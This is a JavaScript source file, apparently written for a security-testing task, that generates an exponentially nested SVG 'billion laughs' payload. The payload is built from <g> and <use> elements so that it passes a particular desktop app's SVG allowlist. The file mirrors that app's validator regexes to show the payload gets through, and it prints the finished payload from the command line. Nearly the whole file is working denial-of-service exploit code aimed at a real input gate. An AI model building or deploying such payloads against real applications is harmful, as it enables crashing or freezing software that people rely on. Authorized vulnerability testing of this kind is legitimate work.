// Task 1.2 — build a billion-laughs SVG using ONLY tags/attributes the app's
// `validate({svg, isTrusted:true})` allowlist accepts (regexes extracted verbatim
// from desktop_app_src/src/app/core/index.js):
//   tags:  svg,defs,linearGradient,radialGradient,stop,g,path,circle,ellipse,rect,
//          clipPath,mask,pattern  (+ image,use when isTrusted)
//   use:   only `href="#id"` or `transform="translate(...)|rotate(...)|scale(...)|matrix(...)"`
//   id:    /^id="(Слой)?[\w:-]+"$/  (any tag)
//   rect:  width/height/x/y numeric attrs allowed
// Self-close ("/>") is only permitted for path/stop/circle/ellipse/rect/image — NOT g/use/svg,
// so g and use must use explicit open/close tags.

function buildBillionLaughsSvg(depth, fanout = 2) {
  let defs = '<rect id="r0" width="1" height="1"></rect>';
  for (let i = 1; i <= depth; i++) {
    const uses = Array.from({ length: fanout }, () => `<use href="#r${i - 1}"></use>`).join('');
    defs += `<g id="r${i}">${uses}</g>`;
  }
  return (
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ' +
    'width="100" height="100" viewBox="0 0 100 100">' +
    `<defs>${defs}</defs>` +
    `<use href="#r${depth}"></use>` +
    '</svg>'
  );
}

// Mirror of the app's validator (same regexes), to self-check our payload passes
// BEFORE handing it to the browser, i.e. prove reachability through the real gate.
function validateLikeApp(svg) {
  const baseTags = ['svg','defs','linearGradient','radialGradient','stop','g','path','circle','ellipse','rect','clipPath','mask','pattern'];
  const trustedExtra = ['image','use'];
  const allTags = [...baseTags, ...trustedExtra];
  const tagSet = new Set(['?xml', ...allTags, ...allTags.map(t => `/${t}`), ...allTags.map(t => `${t}/`)]);
  if (/['`]/u.test(svg)) throw new Error('validate: contains quote/backtick');

  // tokenizeFile
  const tokens = [];
  let n = 0;
  while (n < svg.length) {
    let i = svg.indexOf('<', n);
    if (i === n) { i = svg.indexOf('>', n); if (i <= n) throw new Error('tokenizeFile: > expected'); i++; }
    else if (i === -1) i = svg.length;
    tokens.push(svg.slice(n, i));
    n = i;
  }
  if (tokens.join('') !== svg) throw new Error('tokenizeFile: characters missing');

  const idRe = /^id="(Слой)?[\w:-]+"$/u;
  const useRe = /^(href|xlink:href)="#[\w:-]+"$/u;
  const transformRe = /^((translate|rotate|scale|matrix)\(-?(\.\d+|\d+(\.\d*)?)((, *| |)-?(\.\d+|\d+(\.\d*)?)){0,5}\) *){1,6}$/u;
  const rectNumRe = /^(width|height|rx)="(\.\d+|\d+(\.\d*)?)"$/u;
  const rectPosRe = /^(x|y)="-?(\.\d+|\d+(\.\d*)?)"$/u;
  const svgAttrOk = (e) =>
    e === 'xmlns="http://www.w3.org/2000/svg"' ||
    e === 'xmlns:xlink="http://www.w3.org/1999/xlink"' ||
    /^version="\d.\d"$/u.test(e) ||
    /^(width|height)="(\.\d+|\d+(\.\d*)?)(%|px)?"$/u.test(e) ||
    /^viewBox="(\.\d+|\d+(\.\d*)?)(( |, *)(\.\d+|\d+(\.\d*)?)){3}"$/u.test(e);

  for (const raw of tokens) {
    if (raw.trim() === '') continue;
    // tokenizeLine
    if (!(raw.startsWith('<') && raw.endsWith('>'))) throw new Error('tokenizeLine: bad start/end');
    let e = raw.indexOf(' ');
    if (e < 0) e = raw.length - 1;
    const parts = [raw.slice(1, e)];
    while (e < raw.length - 1) {
      let i = raw.indexOf('"', e);
      if (i === -1) { const end = raw.length - 1; if (e !== end) parts.push(raw.slice(e, end)); e = end; }
      else { const o = raw.indexOf('"', i + 1); if (o <= i) throw new Error('bad quote'); parts.push(raw.slice(e, o + 1)); e = o + 1; }
    }
    const [tag, ...attrs] = parts;
    if (!tagSet.has(tag)) throw new Error(`invalid tag "${tag}"`);
    if (tag.startsWith('/') && attrs.length !== 0) throw new Error(`"${tag}" starts with / but has attrs`);
    for (const a0 of attrs) {
      const a = a0.replace(/^ +/u, '');
      if (idRe.test(a)) continue;
      if (['path','stop','circle','ellipse','rect','image'].includes(tag) && a === '/') continue;
      if (tag === '?xml' && a === '?') continue;
      if (tag === 'use') {
        if (useRe.test(a)) continue;
        const m = a.match(/^transform="(.+)"$/u);
        if (m && transformRe.test(m[1])) continue;
      }
      if (tag === 'svg' && svgAttrOk(a)) continue;
      if (tag === 'rect' && (rectNumRe.test(a) || rectPosRe.test(a))) continue;
      if (tag === 'g' && idRe.test(a)) continue;
      throw new Error(`REJECTED by mirror-validator: tag="${tag}" attr="${a}"`);
    }
  }
  return true;
}

export { buildBillionLaughsSvg, validateLikeApp };

if (import.meta.url === `file://${process.argv[1]}`) {
  const depth = Number(process.argv[2] || 10);
  const svg = buildBillionLaughsSvg(depth);
  validateLikeApp(svg);
  console.error(`depth=${depth} bytes=${svg.length} instantiated_leaf_uses=2^${depth}=${2 ** depth} -- PASSES mirror validator`);
  process.stdout.write(svg);
}
